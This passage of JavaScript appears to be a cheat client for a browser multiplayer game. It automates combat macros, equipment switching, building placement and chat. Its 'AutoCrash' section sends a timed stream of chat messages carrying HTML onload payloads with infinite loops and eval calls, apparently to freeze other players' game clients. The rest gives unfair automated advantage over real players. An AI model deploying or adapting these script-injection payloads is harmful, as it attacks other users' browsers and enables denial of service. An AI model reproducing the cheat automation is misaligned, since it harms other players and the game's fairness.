            if (boostPos && collides(p, spikeRad, boostPos, boostRad)) continue;
            if (avoidPos && collides(p, spikeRad, avoidPos, avoidRad)) continue;
            if (Math.abs(UTILS.getAngleDist(a, baseAngle)) < Math.PI * 0.8)
              return a;
          }
          return null;
        };

        const tryOrder = (firstBase, secondBase) => {
          const first = findSpike(firstBase, null, 0);
          if (first === null) return { first: null, second: null, count: 0 };
          const firstPos = getPos(spikeScale, first);
          const second = findSpike(secondBase, firstPos, spikeRad);
          return {
            first,
            second,
            count: (first !== null ? 1 : 0) + (second !== null ? 1 : 0),
          };
        };

        const rightFirst = tryOrder(rightBase, leftBase);
        const leftFirst = tryOrder(leftBase, rightBase);

        if (rightFirst.count >= leftFirst.count) {
          rightA = rightFirst.first;
          leftA = rightFirst.second;
        } else {
          leftA = leftFirst.first;
          rightA = leftFirst.second;
        }

        if (rightA === null) {
          const lPos = leftA !== null ? getPos(spikeScale, leftA) : null;
          rightA = findAny(rightBase, lPos, spikeRad);
        }
        if (leftA === null) {
          const rPos = rightA !== null ? getPos(spikeScale, rightA) : null;
          leftA = findAny(leftBase, rPos, spikeRad);
        }

        if (boostA !== null) {
          place(4, boostA);
          packet("9", boostA, 1);
          lastMoveDir = boostA;
        }
        if (rightA !== null) place(2, rightA);
        if (leftA !== null) place(2, leftA);
      }
      if (macro.k) {
        let dir = getSafeDir();
        checkPlace(2, dir + Math.PI / 4);
        checkPlace(2, dir - Math.PI / 4);
        checkPlace(2, dir + Math.PI + Math.PI / 4);
        checkPlace(2, dir + Math.PI - Math.PI / 4);
      }
      macro.y && place(5, getSafeDir());
      macro.h && place(player.getItemType(22), getSafeDir());
      macro.n && place(3, getSafeDir());
      if (game.tick % 1 == 0) {
        if (mills.placeSpawnPads) {
          for (let i = 0; i < Math.PI * 2; i += Math.PI / 2) {
            checkPlace(
              player.getItemType(20),
              UTILS.getDirect(player.oldPos, player, 2, 2) + i,
            );
          }
        }
      }
      if (instaC.can) {
        instaC.changeType(player.weapons[1] == 10 ? "rev" : "normal");
      }
      if (instaC.canCounter) {
        instaC.canCounter = false;
        if (player.reloads[player.weapons[0]] == 0 && !instaC.isTrue) {
          if (AB.Menu.counterTick) {
            instaC.counterType();
          }
        }
      }
      if (instaC.canSpikeTick) {
        instaC.canSpikeTick = false;
        if (instaC.revTick) {
          instaC.revTick = false;
          if (
            [1, 2, 3, 4, 5, 6].includes(player.weapons[0]) &&
            player.reloads[player.weapons[1]] == 0 &&
            !instaC.isTrue
          ) {
            instaC.changeType("rev");
          }
        } else {
          if (
            [1, 2, 3, 4, 5, 6].includes(player.weapons[0]) &&
            player.reloads[player.weapons[0]] == 0 &&
            !instaC.isTrue
          ) {
            instaC.spikeTickType();
            if (instaC.syncHit) {
            }
          }
        }
      }
      const enemyTrapped = gameObjects.some(
        (e) =>
          e.trap &&
          e.active &&
          e.isTeamObject &&
          e.isTeamObject(player) &&
          UTILS.getDist(e, near, 0, 2) <= near.scale + e.getScale() + 5,
      );
      if (!clicks.middle && (clicks.left || clicks.right) && !instaC.isTrue) {
        bottics.forEach((c) => {
          if (!c.synchit) {
            c.syncHit();
          }
        });
        if (
          player.weaponIndex !=
          (clicks.right && player.weapons[1] == 10
            ? player.weapons[1]
            : player.weapons[0]) ||
          player.buildIndex > -1
        ) {
          selectWeapon(
            clicks.right && player.weapons[1] == 10
              ? player.weapons[1]
              : player.weapons[0],
          );
        }
        if (
          player.reloads[
          clicks.right && player.weapons[1] == 10
            ? player.weapons[1]
            : player.weapons[0]
          ] == 0 &&
          !my.waitHit
        ) {
          sendAutoGather();
          my.waitHit = 1;
          game.tickBase(() => {
            sendAutoGather();
            my.waitHit = 0;
          }, 1);
        }
      }
      if (
        useWasd &&
        !clicks.left &&
        !clicks.right &&
        !instaC.isTrue &&
        near.dist2 <=
        items.weapons[player.weapons[0]].range + near.scale * 1.8 &&
        !traps.inTrap
      ) {
        if (player.weaponIndex != player.weapons[0] || player.buildIndex > -1) {
          selectWeapon(player.weapons[0]);
        }
        if (player.reloads[player.weapons[0]] == 0 && !my.waitHit) {
          sendAutoGather();
          my.waitHit = 1;
          game.tickBase(() => {
            sendAutoGather();
            my.waitHit = 0;
          }, 1);
        }
      }
      if (traps.inTrap) {
        // Use consolidated AutoBreak module
        Mod.AutoBreak.run();
      } else if (autoBreaking) {
        autoBreaking = false;
      }
    }
    if (clicks.middle && !traps.inTrap) {
      if (!instaC.isTrue && player.reloads[player.weapons[1]] == 0) {
        if (
          my.ageInsta &&
          player.weapons[0] != 4 &&
          player.weapons[1] == 9 &&
          player.age >= 9 &&
          enemy.length
        ) {
          instaC.bowMovement();
        }
      }
    }
    if (
      AB.Menu.TickMenu &&
      AB.Menu.VelTick &&
      !traps.inTrap &&
      enemy.length
    ) {
      instaC.velTickType();
    }
    if (macro.t) {
      if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && (player.weapons[1] == 15 ? (player.reloads[player.weapons[1]] == 0) : true) && (player.weapons[0] == 5 || (player.weapons[0] == 4 && player.weapons[1] == 15))) {
        instaC[(player.weapons[0] == 4 && player.weapons[1] == 15) ? "kmTickMovement" : "tickMovement"]();
      }
    }
    if (macro["."]) {
      if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && ([9, 12, 13, 15].includes(player.weapons[1]) ? (player.reloads[player.weapons[1]] == 0) : true)) {
        instaC.boostTickMovement();
      }
    }

    if (macro[","] && !traps.inTrap) {
      if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0) {
        instaC.oneTickType();
      }
    }
    if (
      player.weapons[1] &&
      !clicks.left &&
      !clicks.right &&
      !traps.inTrap &&
      !instaC.isTrue &&
      !(
        useWasd &&
        near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8
      )
    ) {
      if (
        player.reloads[player.weapons[0]] == 0 &&
        player.reloads[player.weapons[1]] == 0
      ) {
        if (!my.reloaded) {
          my.reloaded = true;
          let fastSpeed =
            items.weapons[player.weapons[0]].spdMult <
              items.weapons[player.weapons[1]].spdMult
              ? 1
              : 0;
          if (
            player.weaponIndex != player.weapons[fastSpeed] ||
            player.buildIndex > -1
          ) {
            selectWeapon(player.weapons[fastSpeed]);
          }
        }
      } else {
        my.reloaded = false;
        if (useWasd) {
          autos.stopspin = false;
        }
        if (player.reloads[player.weapons[0]] > 0) {
          if (
            player.weaponIndex != player.weapons[0] ||
            player.buildIndex > -1
          ) {
            selectWeapon(player.weapons[0]);
          }
        } else if (
          player.reloads[player.weapons[0]] == 0 &&
          player.reloads[player.weapons[1]] > 0
        ) {
          if (
            player.weaponIndex != player.weapons[1] ||
            player.buildIndex > -1
          ) {
            selectWeapon(player.weapons[1]);
          }
          if (useWasd) {
            if (!autos.stopspin) {
              setTimeout(() => {
                autos.stopspin = true;
              }, 750);
            }
          }
        }
      }
    }
    if (!instaC.isTrue && !traps.inTrap && !traps.replaced) {
      Mod.Place.autoPlace();
    }
    if (!macro.q && !macro.f && !macro.v && !macro.h && !macro.n) {
      packet("D", getAttackDir());
    }

    const applyAutoGear = () => {
      if (!AB.Menu.AutoHat) return;

      const leftHat = AB.Menu.LoadoutHatLeft ?? 7;
      const rightHat = AB.Menu.LoadoutHatRight ?? 40;
      const leftAcc = AB.Menu.LoadoutAccLeft ?? 21;
      const rightAcc = AB.Menu.LoadoutAccRight ?? 19;

      const hasNear = !!near && typeof near.dist2 === "number";
      const enemyDist = hasNear ? near.dist2 : Infinity;

      const inWater =
        player.y2 >= config.mapScale / 2 - config.riverWidth / 2 &&
        player.y2 <= config.mapScale / 2 + config.riverWidth / 2;
      const inSnow = player.y2 <= config.snowBiomeTop;
      const baseHat = inWater ? 31 : inSnow ? 15 : 12;

      let antiBullActive = false;
      if (AB.Menu.antiBullType === "abreload") {
        if (hasNear && near.antiBull > 0) {
          player._antiBullUntilTick = game.tick + 3;
        }
        antiBullActive = game.tick <= (player._antiBullUntilTick || 0);
      } else if (AB.Menu.antiBullType === "abalway") {
        antiBullActive = hasNear && near.reloads?.[near.primaryIndex] == 0;
      }

      const pushClose =
        my.autoPush &&
        my.pushData &&
        typeof my.pushData.x === "number" &&
        typeof my.pushData.y === "number" &&
        UTILS.getDist(player, my.pushData, 2, 2) <= 169;

      if (player.empAnti) {
        buyEquip(22, 0);
        return;
      }
      if (player.soldierAnti) {
        buyEquip(6, 0);
        return;
      }
      if (my.anti0Tick > 0) {
        buyEquip(6, leftAcc);
        return;
      }

      if (AB.Menu.weaponGrind && player.items.includes(22)) {
        const gt = AB.Menu.grindTo;
        const targetTier =
          gt === "Gold" ? 1 : gt === "Diamond" ? 2 : gt === "Ruby" ? 3 : gt;
        const pTier =
          player.primaryVariant == undefined ? 0 : player.primaryVariant;
        const sTier =
          player.secondaryVariant == undefined ? 0 : player.secondaryVariant;
        const shouldSkip =
          (pTier >= targetTier && sTier >= targetTier) ||
          (pTier >= targetTier && player.weapons[1] != 10);
        if (!shouldSkip) {
          const reloadIndex =
            AB.Menu.weaponGrind &&
              my.grindPreferred != undefined &&
              now < (my.grindLock || 0)
              ? my.grindPreferred
              : player.weapons[1] == 10
                ? player.weapons[1]
                : player.weapons[0];
          const canSwing = player.reloads[reloadIndex] == 0;
          const hatId = canSwing ? rightHat : 6;
          buyEquip(hatId, 19);
          return;
        }
      }

      if (clicks.left || clicks.right) {
        const isLeft = !!clicks.left;
        const wIndex = isLeft
          ? player.weapons[0]
          : player.weapons[1] === 10
            ? player.weapons[1]
            : player.weapons[0];
        const canSwing = player.reloads[wIndex] == 0;
        const combatHat = canSwing
          ? isLeft
            ? AB.Menu.weaponGrind
              ? rightHat
              : leftHat
            : rightHat
          : 6;
        const combatAcc = isLeft ? leftAcc : rightAcc;
        buyEquip(combatHat, combatAcc);
        return;
      }

      if (
        player._bullHatWanted &&
        !traps.inTrap &&
        !pushClose &&
        enemyDist > 140 &&
        !macro.l
      ) {
        buyEquip(player._bullHatWanted, leftAcc);
        return;
      }

      if (traps.inTrap) {
        const wIndex = player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0];
        const canSwing = player.reloads[wIndex] == 0;
        if (canSwing) {
          buyEquip(rightHat, leftAcc);
        } else {
          buyEquip(6, leftAcc);
        }
        return;
      }

      if ((enemyDist <= 300 || pushClose) && !macro.l) {
        const hatId = antiBullActive ? 11 : 6;
        const accId =
          AB.Menu.antiBullType && AB.Menu.antiBullType !== "noab"
            ? leftAcc
            : rightAcc;
        buyEquip(hatId, accId);
        return;
      }

      buyEquip(baseHat, 11);
    };
    if (
      storeMenu.style.display != "block" &&
      !instaC.isTrue &&
      !instaC.ticking
    ) {
      applyAutoGear();
    }
    if (
      configs.hatCycle &&
      !clicks.right &&
      !clicks.left &&
      !instaC.canSpikeTick &&
      !instaC.isTrue &&
      !instaC.ticking &&
      !traps.inTrap &&
      !instaC.wait
    ) {
      const hats = [51, 50, 28, 29, 30, 36, 37, 38, 44, 35, 42, 43, 49];

      const inRiver = function () {
        const riverMin = config.mapScale / 2 - config.riverWidth / 2;
        const riverMax = config.mapScale / 2 + config.riverWidth / 2;
        return player.y2 >= riverMin && player.y2 <= riverMax;
      };

      if (inRiver()) {
        buyEquip(31, 0);
      } else {
        if (typeof player.hatCycleIndex === "undefined") {
          player.hatCycleIndex = hats.indexOf(Number(player.hat));
          if (player.hatCycleIndex === -1) player.hatCycleIndex = 0;
          player.lastHatSwitchTime = Date.now();
        }

        const currentTime = Date.now();
        if (currentTime - player.lastHatSwitchTime >= 100) {
          player.hatCycleIndex = (player.hatCycleIndex + 1) % hats.length;
          buyEquip(hats[player.hatCycleIndex], 0);
          player.lastHatSwitchTime = currentTime;
        }
      }
    }
    if (configs.autoPush && enemy.length && !traps.inTrap && !instaC.ticking) {
      autoPush();
    } else {
      if (my.autoPush) {
        my.autoPush = false;
        packet("a", lastMoveDir || undefined, 1);
      }
    }

    if (
      configs.safeWalk &&
      player.alive &&
      keysActive() &&
      !my.autoPush &&
      !instaC.ticking
    ) {
      const hasMoveKey = Object.keys(moveKeys).some((k) => keys[k]);
      if (hasMoveKey || lastMoveDir !== undefined) sendMoveDir();
    }

    if (!window.antiInstaState) {
      window.antiInstaState = {
        lastHP: null,
        lastHPTime: 0,
        lastTrigger: 0,
        lastHealTrigger: 0,
        enemyCache: new Map(),
        damageLog: [],
        threatLevel: 0,
      };
    }

    if (configs.AutoCrash) {
      if (!window.autoChatActive) {
        window.autoChatActive = true;
        window.chatMessageIndex = 0;
        window.chatModes = [
          {
            id: 1,
            name: "Crasher!!",
            messages: [
              "<x onload=setInterval('',0)>",
              "<y onload=for(;;){}>",
              "<z onload=while(1){}>",
              "<a onload=eval('for(;;){}')>",
              "<b onload=new Function('while(1){}')()>",
              "<c onload=setTimeout('',0)>",
              "<d onload=requestAnimationFrame(()=>{})>",
              "<e onload=Promise.resolve().then(()=>{})>",
              "<f onload=queueMicrotask(()=>{})>",
              "<g onload=setImmediate(()=>{})>",
            ],
          },
        ];

        window.currentChatMode = window.chatModes[0];

        if (!document.getElementById("chatModeSelect")) {
          var select = document.createElement("select");
          select.id = "chatModeSelect";
          select.className = "Cselect";
          select.style.width = "100%";
          select.style.marginBottom = "10px";
          select.style.display = "none";
          window.chatModes.forEach(function (mode) {
            var option = document.createElement("option");
            option.value = mode.id;
            option.textContent = mode.name;
            select.appendChild(option);
          });
          document.body.appendChild(select);
        }

        var interval = 3000;
        if (!document.getElementById("chatInterval")) {
          var intervalInput = document.createElement("input");
          intervalInput.type = "number";
          intervalInput.id = "chatInterval";
          intervalInput.value = "3000";
          intervalInput.style.display = "none";
          document.body.appendChild(intervalInput);
        } else {
          interval = parseInt(
            document.getElementById("chatInterval").value || "3000",
          );
        }

        interval = 600;

        if (!document.getElementById("statusText")) {
          var statusDiv = document.createElement("div");
          statusDiv.id = "chatStatus";
          statusDiv.style.fontSize = "11px";
          statusDiv.style.color = "#a6aec4";
          statusDiv.style.position = "fixed";
          statusDiv.style.bottom = "10px";
          statusDiv.style.right = "10px";
          statusDiv.style.padding = "8px";
          statusDiv.style.background = "rgba(20,15,35,0.8)";
          statusDiv.style.borderRadius = "8px";
          statusDiv.style.textAlign = "center";
          statusDiv.style.zIndex = "9999";
          statusDiv.innerHTML =
            '<div>Status: <span id="statusText" style="color: #8ecc51;">Active</span></div><div>Messages: <span id="messagesSent" style="color: #ff8a5f;">0</span></div><div>Mode: <span id="currentModeText">' +
            window.currentChatMode.name +
            "</span></div>";
          document.body.appendChild(statusDiv);
        } else {
          document.getElementById("statusText").textContent = "Active";
          document.getElementById("statusText").style.color = "#8ecc51";
          document.getElementById("currentModeText").textContent =
            window.currentChatMode.name;
          document.getElementById("messagesSent").textContent = "0";
        }

        if (!window.altCHandlerAdded) {
          document.addEventListener("keydown", function altCHandler(e) {
            if (e.altKey && e.key === "c" && window.autoChatActive) {
              var select = document.getElementById("chatModeSelect");
              if (!select) return;
              var currentIndex = parseInt(select.value) || 1;
              var nextIndex = currentIndex + 1;
              if (nextIndex > window.chatModes.length) {
                nextIndex = 1;
              }
              select.value = nextIndex;
              window.currentChatMode =
                window.chatModes.find((m) => m.id === nextIndex) ||
                window.chatModes[0];
              window.chatMessageIndex = 0;
              if (document.getElementById("currentModeText")) {
                document.getElementById("currentModeText").textContent =
                  window.currentChatMode.name;
              }
            }
          });
          window.altCHandlerAdded = true;
        }

        window.autoChatInterval = setInterval(function () {
          if (!window.currentChatMode || !window.currentChatMode.messages)
            return;
          var message =
            window.currentChatMode.messages[window.chatMessageIndex];
          try {
            if (typeof packet === "function") packet("6", message);
          } catch (e) {
            console.log("[AutoChat]: " + message);
          }
          window.chatMessageIndex =
            (window.chatMessageIndex + 1) %
            window.currentChatMode.messages.length;
          window.totalMessagesSent = (window.totalMessagesSent || 0) + 1;
          if (document.getElementById("messagesSent")) {
            document.getElementById("messagesSent").textContent =
              window.totalMessagesSent;
          }
          if (document.getElementById("statusText")) {
            var displayMsg =
              message.length > 20 ? message.substring(0, 20) + "..." : message;
            document.getElementById("statusText").innerHTML =
              "Active: <i>" + displayMsg + "</i>";
          }
        }, interval);
      }
    } else {
      if (window.autoChatInterval) {
        clearInterval(window.autoChatInterval);
        window.autoChatInterval = null;
        window.currentChatMode = null;
        window.autoChatActive = false;
        window.altCHandlerAdded = false;

        if (document.getElementById("statusText")) {
          document.getElementById("statusText").textContent = "Stopped";
          document.getElementById("statusText").style.color = "#ff5f5f";
        }
      }
    }

    if (instaC.ticking) {
      instaC.ticking = false;
    }
    if (instaC.syncHit) {
      instaC.syncHit = false;
    }
    if (player.empAnti) {
      if (game.tick > (player._antiGearUntilTick || 0)) {
        player.empAnti = false;
      }
    }
    if (player.soldierAnti) {
      if (game.tick > (player._antiGearUntilTick || 0)) {
        player.soldierAnti = false;
      }
    }
    if (my.anti0Tick > 0) {
      my.anti0Tick--;
    }
    if (traps.replaced) {
      traps.replaced = false;
    }
    if (traps.antiTrapped) {
      traps.antiTrapped = false;
    }

    const getPotentialDamage = (build, user) => {
      const weapIndex =
        user.weapons[1] === 10 && !player.reloads[user.weapons[1]] ? 1 : 0;
      const weap = user.weapons[weapIndex];
      if (player.reloads[weap]) return 0;
      const weapon = items.weapons[weap];
      const inDist = cdf(build, user) <= build.getScale() + weapon.range;
      return user.visible && inDist ? weapon.dmg * (weapon.sDmg || 1) * 3.3 : 0;
    };

    const AutoReplace = () => {
      if (!configs.autoReplace || !inGame || !player) return;
      if (traps.inTrap) return;

      const replaceable = [];
      const gameObjectCount = gameObjects.length;

      if (traps && traps.trackObjectHealth) {
        traps.trackObjectHealth();
      }

      for (let i = 0; i < gameObjectCount; i++) {
        const build = gameObjects[i];
        if (!build || !build.isItem || !build.active || !build.health) continue;
        if (!build.isTeamObject(player)) continue;

        const item = items.list[build.id];
        if (!item) continue;
        const posDist = 35 + item.scale + (item.placeOffset || 0);
        const dist = cdf(build, player);
        if (dist > posDist * 2.5) continue;

        let canDeal = 0;
        const playersCount = players.length;
        for (let j = 0; j < playersCount; j++) {
          const p = players[j];
          if (!p || !p.visible || p.clan === player.clan) continue;
          canDeal += getPotentialDamage(build, p);
        }

        let predictedBreak = false;
        if (traps && traps._healthTracker) {
          const tracked = traps._healthTracker.get(build.sid);
          if (tracked && tracked.dmgRate > 0 && tracked.timeToBreak < 0.5) {
            predictedBreak = true;
          }
        }

        if (build.health <= canDeal || predictedBreak) {
          replaceable.push(build);
        }
      }

      if (replaceable.length === 0) return;

      const findPlacementAngle = (itemId, build) => {
        if (!build || !player.items[itemId]) return null;
        const item = items.list[player.items[itemId]];
        if (!item) return null;

        const buildAngle = Math.atan2(build.y - player.y2, build.x - player.x2);
        const placeR =
          player.scale + (item.scale || 1) + (item.placeOffset || 0);
        const ANGLE_STEP = Math.PI / 60;
        let bestAngle = null;
        let bestDist = Infinity;

        for (let offset = 0; offset < Math.PI; offset += ANGLE_STEP) {
          const candidates =
            offset === 0
              ? [buildAngle]
              : [buildAngle + offset, buildAngle - offset];
          for (const angle of candidates) {
            const px = player.x2 + placeR * Math.cos(angle);
            const py = player.y2 + placeR * Math.sin(angle);
            if (
              item.id !== 18 &&
              py >= config.mapScale / 2 - config.riverWidth / 2 &&
              py <= config.mapScale / 2 + config.riverWidth / 2
            )
              continue;
            let blocked = false;
            for (let k = 0; k < liztobj.length; k++) {
              const o = liztobj[k];
              if (!o.active || o.sid === build.sid) continue;
              const dx = px - o.x,
                dy = py - o.y;
              const minD =
                item.scale +
                (o.blocker ||
                  (o.getScale ? o.getScale(0.6, o.isItem) : o.scale || 35));
              if (dx * dx + dy * dy < minD * minD) {
                blocked = true;
                break;
              }
            }
            if (blocked) continue;

            const d = Math.hypot(px - build.x, py - build.y);
            if (d < bestDist) {
              bestDist = d;
              bestAngle = angle;
            }
            if (d < item.scale * 1.2) return bestAngle;
          }
        }
        return bestAngle;
      };

      const getReplaceBuildId = (build) => {
        let nearTrap = liztobj.filter(
          (tmp) =>
            tmp.trap &&
            tmp.active &&
            tmp.isTeamObject(player) &&
            cdf(tmp, player) <= tmp.getScale() + 5,
        );
        let spike = gameObjects.find(
          (tmp) =>
            tmp.dmg &&
            tmp.active &&
            tmp.isTeamObject(player) &&
            cdf(tmp, player) < 87 &&
            !nearTrap.length,
        );
        if (build.trap) return 4;
        if (build.dmg) return 2;
        return spike ? 4 : 2;
      };

      for (let r = 0; r < replaceable.length; r++) {
        const build = replaceable[r];
        const buildId = getReplaceBuildId(build);
        if (!player.items[buildId]) continue;
        const angle = findPlacementAngle(buildId, build);
        if (angle !== null) {
          place(buildId, angle);
        }
      }
    };

    if (near && near.dist3 <= 400) {
      AutoReplace();
    }
  }
}

for (var i1 = 0; i1 < liztobj.length; i1++) {
  if (
    liztobj[i1].active &&
    liztobj[i1].health > 0 &&
    UTILS.getDist(liztobj[i1], player, 0, 2) < 150 &&
    AB.Menu.antipush
  ) {
    if (liztobj[i1].name.includes("spike") && liztobj[i1]) {
      if (
        liztobj[i1].owner.sid != player.sid &&
        clicks.left == false &&
        tmpObj.reloads[tmpObj.secondaryIndex] == 0
      ) {
        selectWeapon(player.weapons[1]);
        buyEquip(40, 0);
        packet("D", UTILS.getDirect(liztobj[i1], player, 0, 2));
        setTickout(() => {
          buyEquip(6, 0);
        }, 1);
      }
    }
  }
}
function ez(context, x, y) {
  context.fillStyle = "rgba(0, 255, 255, 0.2)";
  context.beginPath();
  context.arc(x, y, 55, 0, Math.PI * 2);
  context.fill();
  context.closePath();
  context.globalAlpha = 1;
}

function updateLeaderboard(data) {
  lastLeaderboardData = data;
  UTILS.removeAllChildren(leaderboardData);
  let tmpC = 1;
  for (let i = 0; i < data.length; i += 3) {
    const id = data[i],
      name = data[i + 1] || "unknown",
      Clan = null /*P.team !== "" ? "[" + P.team + "]" : ""*/,
      score = UTILS.kFormat(data[i + 2]) || "0";
    (function (i) {
      UTILS.generateElement({
        class: "leaderHolder",
        parent: leaderboardData,
        children: [
          UTILS.generateElement({
            class: "leaderboardItem",
            style:
              "color:" +
              (data[i] == playerSID ? "#fff" : "rgba(255,255,255,0.6)"),
            text: tmpC + ". " + (data[i + 1] != "" ? data[i + 1] : "unknown"),
          }),
          UTILS.generateElement({
            class: "leaderScore",
            text: UTILS.sFormat(data[i + 2]) || "0",
          }),
        ],
      });
    })(i);
    playerNames[id] = name;
    playerNamesIds[id] = { id, name, Clan: "" };
    pb[id] = `{${id}} ${name}`;
    tmpC++;
  }
}

function updatePlayerList() {
  AB.playerLog.addThis(
    Object.values(playerNamesIds).map((p) => `[${p.id}] ${p.name}`),
    "rgba(255,255,255,0.6)",
  );
}

setInterval(updatePlayerList, 100);

function get12HourTime() {
  const d = new Date();
  let h = d.getHours(),
    m = d.getMinutes();
  return (
    (h % 12 || 12) + ":" + (m < 10 ? "0" : "") + m + (h >= 12 ? " PM" : " AM")
  );
}

function playerLeaveGame(sid) {
  AB.Chats.add(
    (playerNames[sid] || `[${sid}] Unknown`) + " has rage quit",
    "orange",
    "log",
  );
  delete playerNames[sid];
  delete playerNamesIds[sid];
  delete pb[sid];
  updatePlayerList();
}
function loadGameObject(data) {
  for (let i = 0; i < data.length;) {
    objectManager.add(
      data[i],
      data[i + 1],
      data[i + 2],
      data[i + 3],
      data[i + 4],
      data[i + 5],
      items.list[data[i + 6]],
      true,
      data[i + 7] >= 0
        ? {
          sid: data[i + 7],
        }
        : null,
    );
    15 == data[i + 6] &&
      Math.hypot(player.x2 - data[i + 1], player.y2 - data[i + 2]) < 100 &&
      data[i + 7] != player.sid &&
      traps.AntiTrap(data[i + 6], data[i + 1], data[i + 2]);
    i += 8;
  }
}

function loadAI(data) {
  for (let i = 0; i < ais.length; ++i) {
    ais[i].forcePos = !ais[i].visible;
    ais[i].visible = false;
  }
  if (data) {
    let tmpTime = performance.now();
    for (let i = 0; i < data.length;) {
      tmpObj = findAIBySID(data[i]);
      if (tmpObj) {
        tmpObj.index = data[i + 1];
        tmpObj.t1 = tmpObj.t2 === undefined ? tmpTime : tmpObj.t2;
        tmpObj.t2 = tmpTime;
        tmpObj.x1 = tmpObj.x;
        tmpObj.y1 = tmpObj.y;
        tmpObj.x2 = data[i + 2];
        tmpObj.y2 = data[i + 3];
        tmpObj.d1 = tmpObj.d2 === undefined ? data[i + 4] : tmpObj.d2;
        tmpObj.d2 = data[i + 4];
        tmpObj.health = data[i + 5];
        tmpObj.dt = 0;
        tmpObj.visible = true;
      } else {
        tmpObj = aiManager.spawn(
          data[i + 2],
          data[i + 3],
          data[i + 4],
          data[i + 1],
        );
        tmpObj.x2 = tmpObj.x;
        tmpObj.y2 = tmpObj.y;
        tmpObj.d2 = tmpObj.dir;
        tmpObj.health = data[i + 5];
        if (!aiManager.aiTypes[data[i + 1]].name)
          tmpObj.name = config.cowNames[data[i + 6]];
        tmpObj.forcePos = true;
        tmpObj.sid = data[i];
        tmpObj.visible = true;
      }
      i += 7;
    }
  }
}

function animateAI(sid) {
  tmpObj = findAIBySID(sid);
  if (tmpObj) tmpObj.startAnim();
}

function gatherAnimation(sid, didHit, index) {
  tmpObj = findPlayerBySID(sid);
  if (tmpObj) {
    tmpObj.startAnim(didHit, index);
    tmpObj.gatherIndex = index;
    tmpObj.gathering = 1;
    if (didHit) {
      let tmpObjects = objectManager.hitObj;
      objectManager.hitObj = [];
      game.tickBase(() => {
        tmpObj = findPlayerBySID(sid);
        let val =
          items.weapons[index].dmg *
          config.weaponVariants[
            tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]
          ].val *
          (items.weapons[index].sDmg || 1) *
          (tmpObj.skinIndex == 40 ? 3.3 : 1);
        tmpObjects.forEach((healthy) => {
          healthy.health -= val;
        });
      }, 1);
    }
  }
}
if (nears.filter((near) => near.gathering).length > 1) {
  player.chat.message = "pSyD";
  healer();
}

function wiggleGameObject(dir, sid) {
  const o = findObjectBySid(sid);
  if (!o) return;

  const a = config.gatherWiggle;
  const ix = a * Math.cos(dir);
  const iy = a * Math.sin(dir);

  const shouldSpin = o.pps || o.id === 9;

  if (!o._wig)
    o._wig = {
      vx: 0,
      vy: 0,
      spin: 0,
      spinSpeed: 0,
      maxSpeed: 0.2,
      hitCount: 0,
    };

  if (!shouldSpin && o._wig.spinSpeed > 0) {
    o._wig.spin = 0;
    o._wig.spinSpeed = 0;
    o._wig.hitCount = 0;
  }

  o._wig.vx += ix * 0.75;
  o._wig.vy += iy * 0.75;

  if (shouldSpin) {
    o._wig.spinSpeed = Math.min(
      (o._wig.spinSpeed || 0) + 0.03,
      o._wig.maxSpeed,
    );
    o._wig.lastHitTime = Date.now();
    o._wig.hitCount = (o._wig.hitCount || 0) + 1;
  }

  if (o.health && o.group?.id === 2) objectManager.hitObj.push(o);
}
function updateWiggles(dt = 1) {
  const k = 0.12,
    damp = 0.85;

  for (const o of gameObjects || []) {
    const w = o?._wig;
    if (!w) continue;

    w.vx *= damp;
    w.vy *= damp;

    const shouldSpin = o.pps || o.id === 9;

    // Only process spin for mills (pps) and id === 9 objects
    if (w.spinSpeed !== undefined && shouldSpin) {
      const timeSinceHit = Date.now() - (w.lastHitTime || 0);
      const decelDelay = 300 + (w.hitCount || 0) * 150;

      if (timeSinceHit > decelDelay) {
        const decel = w.spinSpeed < 0.05 ? 0.98 : 0.995;
        w.spinSpeed *= decel;
        if (w.spinSpeed < 0.005) {
          w.spinSpeed = 0;
          w.hitCount = 0;
        }
      }

      w.spin = (w.spin || 0) + w.spinSpeed * dt;
    } else if (w.spinSpeed > 0) {
      // Clear spin for objects that shouldn't spin (e.g., new object placed at same sid)
      w.spin = 0;
      w.spinSpeed = 0;
      w.hitCount = 0;
    }

    if (w) {
      w.vx *= 0.85;
      w.vy *= 0.85;
      o.xWiggle = (o.xWiggle || 0) + w.vx * dt;
      o.yWiggle = (o.yWiggle || 0) + w.vy * dt;
      if (Math.abs(o.xWiggle) < 0.01) o.xWiggle = 0;
      if (Math.abs(o.yWiggle) < 0.01) o.yWiggle = 0;
    }
    if (shouldSpin) {
      if (o.xWiggle) o.xWiggle *= Math.pow(0.99, dt * 0.1);
      if (o.yWiggle) o.yWiggle *= Math.pow(0.99, dt * 0.1);
    }
  }
}

function shootTurret(sid, dir) {
  tmpObj = findObjectBySid(sid);
  if (tmpObj) {
    if (config.anotherVisual) {
      tmpObj.lastDir = dir;
    } else {
      tmpObj.dir = dir;
    }
    tmpObj.xWiggle += config.gatherWiggle * Math.cos(dir + Math.PI);
    tmpObj.yWiggle += config.gatherWiggle * Math.sin(dir + Math.PI);
  }
}

function updatePlayerValue(index, value, updateView) {
  if (!player) return;

  const oldValue = player[index] || 0;
  player[index] = value;

  if (index === "points") {
    if (configs.autoBuy) {
      autoBuy.hat();
      autoBuy.acc();
    }
  }

  if (index === "kills" && value > oldValue) {
    const autoGGType = AB.Menu.autoGGType || "disabled";
    const targetName = instaC.lastTarget || "Enemy";
    const killMessage = instaC.formatKillMessage(targetName);

    AB.Chats.add(killMessage, "#00ff88", "history");

    instaC.resetKillData();
    instaC.lastTarget = null;

    switch (autoGGType) {
      case "abyss":
        sendChat("AutoGG | " + player.kills + " kills");
        break;
      case "robotics":
        sendChat("Robotis winn");
        break;
      case "frozen":
        sendChat("Frozen client v3");
        break;
      case "chicken":
        sendChat("I'm Super Pro");
        break;
      case "redDragon":
        sendChat("<[GG]>x-RedDragon Client<[GG]>");
        break;
      case "zakat":
        sendChat("BOOM! ZAKAT mod v2");
        break;
      case "projectCube":
        sendChat("Auto-GG Project Cube v2");
        setTimeout(() => {
          sendChat("Well Done XDD");
        }, 600);
        break;
      case "happyMod":
        sendChat("gg - AutoGG Happymod");
        setTimeout(() => {
          sendChat("Happy Mod v7");
        }, 400);
        setTimeout(() => {
          sendChat("Made by Happymod");
        }, 400);
        setTimeout(() => {
          sendChat("Subscribe to Happymod");
